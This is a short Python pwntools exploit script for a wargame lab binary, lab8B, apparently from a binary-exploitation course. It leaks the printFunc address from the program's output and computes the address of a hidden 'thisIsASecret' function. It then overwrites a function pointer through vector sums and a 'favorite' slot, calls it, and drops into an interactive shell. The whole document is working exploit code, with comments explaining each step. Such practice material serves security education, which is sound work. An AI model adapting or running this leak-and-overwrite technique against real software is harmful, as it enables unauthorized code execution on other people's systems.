from pwn import * 

p = process("/levels/lab08/lab8B") 

# Write to a vector 
def write_values(vector, val = 1):
    p.sendline('1') 
    p.sendline(str(vector))
    for index in range(9):
        write_time = val
        if(index == 4):
            write_time = val
        else: 
            write_time = 1
        
        p.sendline(str(write_time))

# Read the address of the vector 
def read_leak():
    p.sendline('3') # Command 
    p.sendline('1') # Vector 
    p.recvuntil('void printFunc: ')
    leak = int(p.recvline(),16) # The memory leak in order to get the offset for the /bin/sh function 
    p.recv() 
    return leak 

# In order to get the integer section (which is 4 bytes) to overwrite the value that we want, we need to set the favorite numbers to go through 3 times, because this is the nth spot.
def eat_favorite_spots(n):
    for i in range(n): 
        p.sendline('4') 
    return 

# Write to a vector, in order to get the memory leak from the print
write_values(1) 
leak = read_leak() 
eat_favorite_spots(4) 


# Setup the vectors to be used
# The thisIsASecret function is 66 bytes above printVector 
# There is an additional -1 because the value has to be added with a non-zero value from the other vector. All values are set to 1 for this.  
write_values(1,leak - 66 -1) 

write_values(2) 

#Sum them together 
p.sendline('2') 

# Store the sum as a favorite 
p.sendline('4') 

# Load the favorite into a register
p.sendline('6') 
p.sendline('4') # Location being loaded
p.sendline('1') 

# Call the print function for the new loaded object
p.sendline('3') 
p.sendline('1') 

# Happy shelling! :) 
p.interactive() 


